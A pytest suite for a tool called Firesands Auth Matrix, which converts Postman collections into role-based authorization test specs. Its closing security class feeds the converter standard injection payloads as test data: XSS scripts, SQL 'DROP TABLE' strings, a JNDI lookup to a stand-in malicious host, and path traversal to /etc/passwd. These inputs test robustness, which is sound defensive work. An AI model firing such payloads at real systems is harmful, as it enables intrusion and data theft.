"""
Test suite for Firesands Auth Matrix
"""

import pytest
import json
import sys
import os
import tempfile
import io
from unittest.mock import patch, mock_open, MagicMock

# Add the parent directory to the path so we can import our modules
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from Firesand_Auth_Matrix import (
    detect_file_type,
    convert_postman_to_authmatrix,
    extract_base_url_from_postman,
    extract_requests_from_postman,
    load_and_convert_spec,
    run_spec,
    print_matrix,
    show_help,
    main,
    __version__,
    AUTHMATRIX_SHEBANG
)


class TestHelpFunction:
    """Test help function output"""
    
    @patch('sys.stdout', new_callable=io.StringIO)
    def test_show_help(self, mock_stdout):
        """Test help function displays correct information"""
        show_help()
        output = mock_stdout.getvalue()
        
        assert "Firesands Auth Matrix" in output
        assert __version__ in output
        assert "Usage:" in output
        assert "--help" in output
        assert "--version" in output
        assert "AuthMatrix format" in output
        assert "Postman collection" in output


class TestFileTypeDetection:
    """Test file type detection functionality"""
    
    def test_detect_authmatrix_format(self):
        """Test detection of AuthMatrix format files"""
        # Create a temporary file with AuthMatrix shebang
        test_content = "#!AUTHMATRIX\n{\"test\": \"data\"}"
        with open("test_authmatrix.json", "w") as f:
            f.write(test_content)
        
        try:
            result = detect_file_type("test_authmatrix.json")
            assert result == "authmatrix"
        finally:
            os.remove("test_authmatrix.json")
    
    def test_detect_postman_format(self):
        """Test detection of Postman format files"""
        # Create a temporary file without AuthMatrix shebang
        test_content = "{\"info\": {\"name\": \"Test Collection\"}}"
        with open("test_postman.json", "w") as f:
            f.write(test_content)
        
        try:
            result = detect_file_type("test_postman.json")
            assert result == "postman"
        finally:
            os.remove("test_postman.json")
    
    def test_detect_unknown_format(self):
        """Test detection of unknown format files"""
        # Create a non-existent file
        result = detect_file_type("non_existent_file.json")
        assert result == "unknown"
    
    def test_detect_file_type_with_permission_error(self):
        """Test file detection with permission error"""
        with patch('builtins.open', side_effect=PermissionError("Permission denied")):
            result = detect_file_type("restricted_file.json")
            assert result == "unknown"
    
    def test_detect_file_type_with_unicode_error(self):
        """Test file detection with unicode decode error"""
        with patch('builtins.open', mock_open(read_data=b'\xff\xfe')):
            with patch('builtins.open', side_effect=UnicodeDecodeError('utf-8', b'\xff\xfe', 0, 1, 'invalid start byte')):
                result = detect_file_type("binary_file.json")
                assert result == "unknown"
    
    def test_detect_file_type_with_empty_file(self):
        """Test detection with empty file"""
        with patch('builtins.open', mock_open(read_data="")):
            result = detect_file_type("empty_file.json")
            assert result == "postman"  # Empty file defaults to postman


class TestPostmanConversion:
    """Test Postman to AuthMatrix conversion functionality"""
    
    @pytest.fixture(autouse=True)
    def setup_method(self):
        """Set up test data"""
        self.sample_postman = {
            "info": {
                "name": "Test API",
                "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
            },
            "auth": {
                "type": "bearer",
                "bearer": [
                    {"key": "token", "value": "test-bearer-token"}
                ]
            },
            "item": [
                {
                    "name": "Get Users",
                    "request": {
                        "method": "GET",
                        "url": {
                            "raw": "https://api.example.com/users",
                            "protocol": "https",
                            "host": ["api", "example", "com"],
                            "path": ["users"]
                        }
                    }
                },
                {
                    "name": "Admin Folder",
                    "item": [
                        {
                            "name": "Get Admin Dashboard",
                            "request": {
                                "method": "GET",
                                "url": {
                                    "raw": "https://api.example.com/admin/dashboard",
                                    "protocol": "https",
                                    "host": ["api", "example", "com"],
                                    "path": ["admin", "dashboard"]
                                }
                            }
                        }
                    ]
                }
            ]
        }
    
    def test_extract_base_url(self):
        """Test base URL extraction from Postman collection"""
        result = extract_base_url_from_postman(self.sample_postman)
        assert result == "https://api.example.com"
    
    def test_convert_basic_collection(self):
        """Test basic conversion of Postman collection"""
        result = convert_postman_to_authmatrix(self.sample_postman)
        
        # Check basic structure
        assert "base_url" in result
        assert "roles" in result
        assert "endpoints" in result
        assert "default_headers" in result
        
        # Check base URL
        assert result["base_url"] == "https://api.example.com"
        
        # Check roles
        assert "guest" in result["roles"]
        assert "admin" in result["roles"]
        
        # Check admin role auth
        admin_auth = result["roles"]["admin"]["auth"]
        assert admin_auth["type"] == "bearer"
        assert admin_auth["token"] == "test-bearer-token"
        
        # Check endpoints
        assert len(result["endpoints"]) == 2
        
        # Check endpoint names and paths
        endpoint_paths = [ep["path"] for ep in result["endpoints"]]
        assert "/users" in endpoint_paths
        assert "/admin/dashboard" in endpoint_paths
    
    def test_convert_postman_with_string_url(self):
        """Test conversion with string URL format"""
        postman_data = {
            "info": {"name": "String URL Test"},
            "item": [
                {
                    "name": "Test Request",
                    "request": {
                        "method": "POST",
                        "url": "https://api.example.com/test/endpoint"
                    }
                }
            ]
        }
        
        result = convert_postman_to_authmatrix(postman_data)
        assert result["base_url"] == "https://api.example.com"
        assert len(result["endpoints"]) == 1
        assert result["endpoints"][0]["path"] == "/test/endpoint"
        assert result["endpoints"][0]["method"] == "POST"
    
    def test_convert_postman_with_port(self):
        """Test conversion with URL containing port"""
        postman_data = {
            "info": {"name": "Port Test"},
            "item": [
                {
                    "name": "Port Request",
                    "request": {
                        "method": "GET",
                        "url": {
                            "protocol": "http",
                            "host": ["localhost"],
                            "port": "8080",
                            "path": ["api", "v1"]
                        }
                    }
                }
            ]
        }
        
        result = convert_postman_to_authmatrix(postman_data)
        assert result["base_url"] == "http://localhost:8080"
        assert result["endpoints"][0]["path"] == "/api/v1"
    
    def test_convert_postman_no_auth(self):
        """Test conversion of Postman collection without auth"""
        postman_data = {
            "info": {"name": "No Auth Collection"},
            "item": [
                {
                    "name": "Public Request",
                    "request": {
                        "method": "GET",
                        "url": "https://api.example.com/public"
                    }
                }
            ]
        }
        
        result = convert_postman_to_authmatrix(postman_data)
        # Should only have guest role
        assert list(result["roles"].keys()) == ["guest"]
        assert result["roles"]["guest"]["auth"]["type"] == "none"
    
    def test_convert_postman_with_invalid_bearer_auth(self):
        """Test conversion with malformed bearer auth"""
        postman_data = {
            "info": {"name": "Invalid Auth"},
            "auth": {
                "type": "bearer",
                "bearer": [
                    {"key": "invalid", "value": "wrong_key"}
                ]
            },
            "item": []
        }
        
        result = convert_postman_to_authmatrix(postman_data)
        # Should only have guest role since bearer token not found
        assert list(result["roles"].keys()) == ["guest"]
    
    def test_convert_empty_collection(self):
        """Test conversion of empty Postman collection"""
        empty_collection = {
            "info": {"name": "Empty Collection"},
            "item": []
        }
        
        result = convert_postman_to_authmatrix(empty_collection)
        assert len(result["endpoints"]) == 0
        assert "guest" in result["roles"]


class TestBaseUrlExtraction:
    """Test base URL extraction from Postman collections"""
    
    def test_extract_base_url_empty_collection(self):
        """Test base URL extraction from empty collection"""
        result = extract_base_url_from_postman({})
        assert result == ""
    
    def test_extract_base_url_no_items(self):
        """Test base URL extraction when no items present"""
        result = extract_base_url_from_postman({"item": []})
        assert result == ""
    
    def test_extract_base_url_invalid_url(self):
        """Test base URL extraction with invalid URL"""
        postman_data = {
            "item": [
                {
                    "request": {
                        "url": "not-a-valid-url"
                    }
                }
            ]
        }
        result = extract_base_url_from_postman(postman_data)
        # Invalid URLs may return partial results like "://" from urlparse
        assert result in ["", "://"]
    
    def test_extract_base_url_malformed_object_url(self):
        """Test base URL extraction with malformed object URL"""
        postman_data = {
            "item": [
                {
                    "request": {
                        "url": {
                            "host": []  # Empty host array
                        }
                    }
                }
            ]
        }
        result = extract_base_url_from_postman(postman_data)
        assert result == ""
    
    def test_extract_base_url_nested_items(self):
        """Test base URL extraction from nested folder structure"""
        postman_data = {
            "item": [
                {
                    "name": "Folder",
                    "item": [
                        {
                            "name": "Nested Request",
                            "request": {
                                "url": "https://nested.api.com/endpoint"
                            }
                        }
                    ]
                }
            ]
        }
        result = extract_base_url_from_postman(postman_data)
        assert result == "https://nested.api.com"


class TestRequestExtraction:
    """Test request extraction from Postman collections"""
    
    def test_extract_requests_empty_collection(self):
        """Test request extraction from empty collection"""
        result = extract_requests_from_postman({})
        assert result == []
    
    def test_extract_requests_no_url(self):
        """Test request extraction when request has no URL"""
        postman_data = {
            "item": [
                {
                    "name": "No URL Request",
                    "request": {
                        "method": "GET"
                        # No URL field
                    }
                }
            ]
        }
        result = extract_requests_from_postman(postman_data)
        assert len(result) == 1
        assert result[0]["path"] == "/"
    
    def test_extract_requests_invalid_url_string(self):
        """Test request extraction with invalid URL string"""
        postman_data = {
            "item": [
                {
                    "name": "Invalid URL",
                    "request": {
                        "method": "POST",
                        "url": "not-a-valid-url"
                    }
                }
            ]
        }
        result = extract_requests_from_postman(postman_data)
        assert len(result) == 1
        # urlparse may treat the whole string as path for invalid URLs
        assert result[0]["path"] in ["/", "not-a-valid-url"]
        assert result[0]["method"] == "POST"
    
    def test_extract_requests_no_path_in_url_object(self):
        """Test request extraction when URL object has no path"""
        postman_data = {
            "item": [
                {
                    "name": "No Path",
                    "request": {
                        "url": {
                            "host": ["api", "example", "com"]
                            # No path field
                        }
                    }
                }
            ]
        }
        result = extract_requests_from_postman(postman_data)
        assert len(result) == 1
        assert result[0]["path"] == "/"


class TestSpecLoading:
    """Test specification loading functionality"""
    
    def test_load_authmatrix_spec(self):
        """Test loading AuthMatrix specification"""
        authmatrix_content = """#!AUTHMATRIX
{
    "base_url": "https://api.test.com",
    "roles": {
        "guest": {"auth": {"type": "none"}},
        "user": {"auth": {"type": "bearer", "token": "user-token"}}
    },
    "endpoints": [
        {
            "name": "Test Endpoint",
            "method": "GET",
            "path": "/test",
            "expect": {
                "guest": {"status": 403},
                "user": {"status": 200}
            }
        }
    ]
}"""
        
        with open("test_spec.json", "w") as f:
            f.write(authmatrix_content)
        
        try:
            result = load_and_convert_spec("test_spec.json")
            
            # Check structure
            assert "base_url" in result
            assert "roles" in result
            assert "endpoints" in result
            
            # Check content
            assert result["base_url"] == "https://api.test.com"
            assert len(result["roles"]) == 2
            assert len(result["endpoints"]) == 1
            
            # Check endpoint expectations
            endpoint = result["endpoints"][0]
            assert endpoint["expect"]["guest"]["status"] == 403
            assert endpoint["expect"]["user"]["status"] == 200
            
        finally:
            os.remove("test_spec.json")
    
    def test_load_postman_spec(self):
        """Test loading and converting Postman specification"""
        postman_content = {
            "info": {"name": "Test Collection"},
            "item": [
                {
                    "name": "Test Request",
                    "request": {
                        "method": "GET",
                        "url": "https://api.test.com/endpoint"
                    }
                }
            ]
        }
        
        with open("test_postman.json", "w") as f:
            json.dump(postman_content, f)
        
        try:
            result = load_and_convert_spec("test_postman.json")
            
            # Should be converted to AuthMatrix format
            assert "base_url" in result
            assert "roles" in result
            assert "endpoints" in result
            
            # Should have at least guest role
            assert "guest" in result["roles"]
            
            # Should have the endpoint
            assert len(result["endpoints"]) == 1
            assert result["endpoints"][0]["method"] == "GET"
            
        finally:
            os.remove("test_postman.json")


class TestSpecLoadingEdgeCases:
    """Test spec loading with edge cases and error conditions"""
    
    def test_load_spec_with_invalid_json(self):
        """Test loading spec with invalid JSON"""
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json') as f:
            f.write("{ invalid json")
            temp_file = f.name
        
        try:
            with pytest.raises(json.JSONDecodeError):
                load_and_convert_spec(temp_file)
        finally:
            os.unlink(temp_file)
    
    def test_load_spec_nonexistent_file(self):
        """Test loading spec from nonexistent file"""
        with pytest.raises(FileNotFoundError):
            load_and_convert_spec("nonexistent_file.json")
    
    def test_load_spec_authmatrix_format_without_shebang_data(self):
        """Test loading AuthMatrix format without proper JSON after shebang"""
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json') as f:
            f.write(f"{AUTHMATRIX_SHEBANG}\ninvalid json")
            temp_file = f.name
        
        try:
            with pytest.raises(json.JSONDecodeError):
                load_and_convert_spec(temp_file)
        finally:
            os.unlink(temp_file)
    
    def test_load_spec_postman_auto_detected(self):
        """Test loading Postman collection auto-detected without explicit detection"""
        postman_content = {
            "info": {"name": "Auto Detect Test"},
            "item": [
                {
                    "name": "Test Request",
                    "request": {
                        "method": "GET",
                        "url": "https://api.example.com/test"
                    }
                }
            ]
        }
        
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json') as f:
            json.dump(postman_content, f)
            temp_file = f.name
        
        try:
            result = load_and_convert_spec(temp_file)
            assert "base_url" in result
            assert "roles" in result
            assert "endpoints" in result
            assert len(result["endpoints"]) == 1
        finally:
            os.unlink(temp_file)
    
    def test_load_spec_plain_authmatrix_without_shebang(self):
        """Test loading plain AuthMatrix JSON without shebang"""
        authmatrix_content = {
            "base_url": "https://api.test.com",
            "roles": {
                "guest": {"auth": {"type": "none"}}
            },
            "endpoints": []
        }
        
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json') as f:
            json.dump(authmatrix_content, f)
            temp_file = f.name
        
        try:
            result = load_and_convert_spec(temp_file)
            # Without shebang, it's detected as postman and gets converted
            # Since it doesn't have "info" and "item", it becomes a new authmatrix format
            assert "base_url" in result
            assert "roles" in result
            # The base_url will be empty since it's not a valid postman collection
            assert result["base_url"] == ""
        finally:
            os.unlink(temp_file)


class TestRunSpec:
    """Test the run_spec function that executes API tests"""
    
    @patch('requests.request')
    def test_run_spec_success(self, mock_request):
        """Test successful spec execution"""
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_request.return_value = mock_response
        
        spec = {
            "base_url": "https://api.test.com",
            "default_headers": {"Accept": "application/json"},
            "roles": {
                "guest": {"auth": {"type": "none"}},
                "admin": {"auth": {"type": "bearer", "token": "admin-token"}}
            },
            "endpoints": [
                {
                    "name": "Test Endpoint",
                    "method": "GET",
                    "path": "/test",
                    "expect": {
                        "guest": {"status": 403},
                        "admin": {"status": 200}
                    }
                }
            ]
        }
        
        results = run_spec(spec)
        
        # Check structure
        assert "Test Endpoint" in results
        assert "guest" in results["Test Endpoint"]
        assert "admin" in results["Test Endpoint"]
        
        # Admin should pass (200 expected, 200 received)
        admin_result = results["Test Endpoint"]["admin"]
        assert admin_result["status"] == "PASS"
        assert admin_result["http"] == 200
        assert "latency_ms" in admin_result
        
        # Guest should fail (403 expected, 200 received)
        guest_result = results["Test Endpoint"]["guest"]
        assert guest_result["status"] == "FAIL"
        assert guest_result["http"] == 200
    
    @patch('requests.request')
    def test_run_spec_with_list_status_codes(self, mock_request):
        """Test spec execution with list of acceptable status codes"""
        mock_response = MagicMock()
        mock_response.status_code = 201
        mock_request.return_value = mock_response
        
        spec = {
            "base_url": "https://api.test.com",
            "roles": {
                "user": {"auth": {"type": "none"}}
            },
            "endpoints": [
                {
                    "name": "Create Endpoint",
                    "method": "POST",
                    "path": "/create",
                    "expect": {
                        "user": {"status": [200, 201, 202]}  # List of acceptable codes
                    }
                }
            ]
        }
        
        results = run_spec(spec)
        
        # Should pass since 201 is in the acceptable list
        user_result = results["Create Endpoint"]["user"]
        assert user_result["status"] == "PASS"
        assert user_result["http"] == 201
    
    def test_run_spec_skip_missing_expectations(self):
        """Test spec execution skips endpoints with no expectations for a role"""
        spec = {
            "base_url": "https://api.test.com",
            "roles": {
                "guest": {"auth": {"type": "none"}},
                "admin": {"auth": {"type": "bearer", "token": "token"}}
            },
            "endpoints": [
                {
                    "name": "Admin Only",
                    "method": "GET",
                    "path": "/admin",
                    "expect": {
                        "admin": {"status": 200}
                        # No expectation for guest
                    }
                }
            ]
        }
        
        results = run_spec(spec)
        
        # Guest should be skipped
        guest_result = results["Admin Only"]["guest"]
        assert guest_result["status"] == "SKIP"
        
        # Admin should be attempted (will fail without mocking requests)
        admin_result = results["Admin Only"]["admin"]
        assert admin_result["status"] == "FAIL"
        assert "error" in admin_result
    
    @patch('requests.request')
    def test_run_spec_network_error(self, mock_request):
        """Test spec execution with network error"""
        mock_request.side_effect = ConnectionError("Network error")
        
        spec = {
            "base_url": "https://api.test.com",
            "roles": {
                "user": {"auth": {"type": "none"}}
            },
            "endpoints": [
                {
                    "name": "Network Fail",
                    "method": "GET",
                    "path": "/test",
                    "expect": {
                        "user": {"status": 200}
                    }
                }
            ]
        }
        
        results = run_spec(spec)
        
        user_result = results["Network Fail"]["user"]
        assert user_result["status"] == "FAIL"
        assert "error" in user_result
        assert "Network error" in user_result["error"]
    
    def test_run_spec_uses_endpoint_name_fallback(self):
        """Test spec execution uses path as name when name is missing"""
        spec = {
            "base_url": "https://api.test.com",
            "roles": {
                "user": {"auth": {"type": "none"}}
            },
            "endpoints": [
                {
                    # No name field
                    "method": "GET",
                    "path": "/no-name",
                    "expect": {
                        "user": {"status": 200}
                    }
                }
            ]
        }
        
        results = run_spec(spec)
        
        # Should use path as key since no name provided
        assert "/no-name" in results
        user_result = results["/no-name"]["user"]
        assert user_result["status"] == "FAIL"  # Will fail without mocking


class TestPrintMatrix:
    """Test the print_matrix function that displays results"""
    
    @patch('sys.stdout', new_callable=io.StringIO)
    def test_print_matrix_basic(self, mock_stdout):
        """Test basic matrix printing"""
        results = {
            "GET /users": {
                "guest": {"status": "FAIL", "http": 403},
                "admin": {"status": "PASS", "http": 200, "latency_ms": 150}
            },
            "POST /admin/settings": {
                "guest": {"status": "FAIL", "http": 403},
                "admin": {"status": "PASS", "http": 200, "latency_ms": 75}
            }
        }
        
        print_matrix(results)
        output = mock_stdout.getvalue()
        
        # Check header
        assert "Endpoint" in output
        assert "guest" in output
        assert "admin" in output
        
        # Check endpoints
        assert "GET /users" in output
        assert "POST /admin/settings" in output
        
        # Check status indicators
        assert "❌" in output  # Fail
        assert "✅" in output  # Pass
        
        # Check HTTP codes
        assert "403" in output
        assert "200" in output
    
    @patch('sys.stdout', new_callable=io.StringIO)
    def test_print_matrix_with_skip(self, mock_stdout):
        """Test matrix printing with skipped tests"""
        results = {
            "GET /public": {
                "guest": {"status": "PASS", "http": 200},
                "admin": {"status": "SKIP"}
            }
        }
        
        print_matrix(results)
        output = mock_stdout.getvalue()
        
        assert "⏭️" in output  # Skip indicator
        assert "✅" in output  # Pass indicator
    
    @patch('sys.stdout', new_callable=io.StringIO)
    def test_print_matrix_long_endpoint_names(self, mock_stdout):
        """Test matrix printing with long endpoint names"""
        results = {
            "GET /very/long/endpoint/name/that/exceeds/normal/length": {
                "guest": {"status": "FAIL", "http": 404}
            }
        }
        
        print_matrix(results)
        output = mock_stdout.getvalue()
        
        # Should handle long names gracefully
        assert "GET /very/long/endpoint" in output
        assert "404" in output


class TestMainFunction:
    """Test the main function and command line interface"""
    
    @patch('sys.argv', ['Firesand_Auth_Matrix.py'])
    @patch('Firesand_Auth_Matrix.start_ui')
    def test_main_no_args(self, mock_start_ui):
        """Test main function with no arguments launches GUI"""
        main()
        mock_start_ui.assert_called_once()
    
    @patch('sys.argv', ['Firesand_Auth_Matrix.py', '--help'])
    @patch('sys.stdout', new_callable=io.StringIO)
    def test_main_help_flag(self, mock_stdout):
        """Test main function with --help flag"""
        main()
        output = mock_stdout.getvalue()
        assert "Firesands Auth Matrix" in output
        assert "Usage:" in output
    
    @patch('sys.argv', ['Firesand_Auth_Matrix.py', '-h'])
    @patch('sys.stdout', new_callable=io.StringIO)
    def test_main_help_flag_short(self, mock_stdout):
        """Test main function with -h flag"""
        main()
        output = mock_stdout.getvalue()
        assert "Firesands Auth Matrix" in output
    
    @patch('sys.argv', ['Firesand_Auth_Matrix.py', '--version'])
    @patch('sys.stdout', new_callable=io.StringIO)
    def test_main_version_flag(self, mock_stdout):
        """Test main function with --version flag"""
        main()
        output = mock_stdout.getvalue()
        assert __version__ in output
        assert "Firesands Auth Matrix" in output
    
    @patch('sys.argv', ['Firesand_Auth_Matrix.py', '-v'])
    @patch('sys.stdout', new_callable=io.StringIO)
    def test_main_version_flag_short(self, mock_stdout):
        """Test main function with -v flag"""
        main()
        output = mock_stdout.getvalue()
        assert __version__ in output
    
    @patch('sys.argv', ['Firesand_Auth_Matrix.py', 'test_spec.json'])
    @patch('Firesand_Auth_Matrix.load_and_convert_spec')
    @patch('Firesand_Auth_Matrix.run_spec')
    @patch('Firesand_Auth_Matrix.print_matrix')
    def test_main_spec_file(self, mock_print, mock_run, mock_load):
        """Test main function with spec file argument"""
        mock_load.return_value = {"base_url": "test", "roles": {}, "endpoints": []}
        mock_run.return_value = {}
        
        main()
        
        mock_load.assert_called_once_with('test_spec.json')
        mock_run.assert_called_once()
        mock_print.assert_called_once()
    
    @patch('sys.argv', ['Firesand_Auth_Matrix.py', 'nonexistent.json'])
    @patch('sys.stdout', new_callable=io.StringIO)
    @patch('sys.stderr', new_callable=io.StringIO)
    def test_main_file_not_found(self, mock_stderr, mock_stdout):
        """Test main function with nonexistent file"""
        with pytest.raises(SystemExit):
            main()
        
        # Should print error message
        assert mock_stdout.getvalue() or mock_stderr.getvalue()
    
    @patch('sys.argv', ['Firesand_Auth_Matrix.py', 'arg1', 'arg2', 'arg3'])
    @patch('sys.stdout', new_callable=io.StringIO)
    def test_main_too_many_args(self, mock_stdout):
        """Test main function with too many arguments"""
        with pytest.raises(SystemExit):
            main()
        
        output = mock_stdout.getvalue()
        assert "Too many arguments" in output
        assert "--help" in output
    
    @patch('sys.argv', ['Firesand_Auth_Matrix.py', 'invalid.json'])
    def test_main_invalid_json_file(self):
        """Test main function with invalid JSON file"""
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json') as f:
            f.write("invalid json content")
            temp_file = f.name
        
        try:
            with patch('sys.argv', ['Firesand_Auth_Matrix.py', temp_file]):
                with pytest.raises(SystemExit):
                    main()
        finally:
            os.unlink(temp_file)


class TestSecurityAndInjection:
    """Test security aspects and injection attempts"""
    
    def test_postman_conversion_with_malicious_json(self):
        """Test Postman conversion with potentially malicious JSON structures"""
        malicious_postman = {
            "info": {"name": "<script>alert('xss')</script>"},
            "item": [
                {
                    "name": "'; DROP TABLE users; --",
                    "request": {
                        "method": "GET",
                        "url": "javascript:alert('xss')"
                    }
                }
            ]
        }
        
        # Should not crash and should sanitize content
        result = convert_postman_to_authmatrix(malicious_postman)
        assert "base_url" in result
        assert len(result["endpoints"]) == 1
        # The malicious content should be preserved as-is since it's just data
        assert result["endpoints"][0]["name"] == "'; DROP TABLE users; --"
    
    def test_file_detection_with_large_file(self):
        """Test file type detection with very large file"""
        # Create a large first line that could cause issues
        large_content = "A" * 10000 + "\n" + '{"test": "data"}'
        
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json') as f:
            f.write(large_content)
            temp_file = f.name
        
        try:
            result = detect_file_type(temp_file)
            # Should handle large files gracefully
            assert result == "postman"  # Not authmatrix since no shebang
        finally:
            os.unlink(temp_file)
    
    def test_spec_loading_with_deeply_nested_json(self):
        """Test spec loading with deeply nested JSON structure"""
        # Create deeply nested structure (reasonable depth to avoid recursion limit)
        nested_json = {"level": 1}
        current = nested_json
        for i in range(2, 100):  # Create 99 levels of nesting (reasonable depth)
            current["level"] = {"level": i}
            current = current["level"]
        
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json') as f:
            json.dump(nested_json, f)
            temp_file = f.name
        
        try:
            # Should handle deep nesting without stack overflow
            result = load_and_convert_spec(temp_file)
            assert "base_url" in result
        finally:
            os.unlink(temp_file)
    
    def test_url_extraction_with_malformed_urls(self):
        """Test URL extraction with various malformed URLs"""
        malformed_urls = [
            "../../etc/passwd",
            "file:///etc/passwd", 
            "ftp://malicious.com/",
            "data:text/html,<script>alert('xss')</script>",
            "javascript:void(0)",
            "http://[invalid:ipv6",
            "http://user:password@host:99999999999/path"
        ]
        
        for url in malformed_urls:
            postman_data = {
                "item": [
                    {
                        "request": {
                            "url": url
                        }
                    }
                ]
            }
            
            # Should not crash and should handle gracefully
            result = extract_base_url_from_postman(postman_data)
            # Most malformed URLs should result in empty string
            assert isinstance(result, str)
    
    def test_bearer_token_with_injection_attempts(self):
        """Test bearer token handling with potential injection payloads"""
        injection_tokens = [
            "'; DROP TABLE tokens; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://malicious.com/}",
            "../../../etc/passwd",
            "\x00\x01\x02",  # Binary data
            "A" * 10000  # Very long token
        ]
        
        for token in injection_tokens:
            postman_data = {
                "info": {"name": "Injection Test"},
                "auth": {
                    "type": "bearer",
                    "bearer": [
                        {"key": "token", "value": token}
                    ]
                },
                "item": []
            }
            
            # Should handle malicious tokens without crashing
            result = convert_postman_to_authmatrix(postman_data)
            assert "admin" in result["roles"]
            assert result["roles"]["admin"]["auth"]["token"] == token
            # The token should be preserved as-is since it's just configuration data


if __name__ == "__main__":
    pytest.main([__file__])